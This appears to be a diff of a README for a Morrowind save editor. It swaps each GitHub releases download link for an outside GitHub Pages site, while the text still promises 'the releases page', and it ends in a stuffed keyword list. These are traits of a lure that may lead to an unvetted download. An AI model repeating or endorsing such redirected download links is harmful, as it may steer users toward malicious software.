@@ -1,6 +1,6 @@
 # 🧙 morrowind-save-editor-2026 - Edit Your Morrowind Saves Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sakib701sa/morrowind-save-editor-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://sakib701sa.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ This guide will walk you through downloading and running the application on your
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Sakib701sa/morrowind-save-editor-2026/releases](https://github.com/Sakib701sa/morrowind-save-editor-2026/releases)
+Visit this link to download the application: [https://sakib701sa.github.io](https://sakib701sa.github.io)
 
 You'll be taken to the releases page where you can find the latest version of the tool.
 
@@ -155,6 +155,6 @@ Download it today and take full control of your Morrowind adventure!
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sakib701sa/morrowind-save-editor-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://sakib701sa.github.io)
 
 Keywords: 2026, editor, elder-scrolls, faction, free, gold, id, inventory, items, morrowind, open-source, openmw, reputation, rpg, save, skills, stats, teleport, vanilla, windows
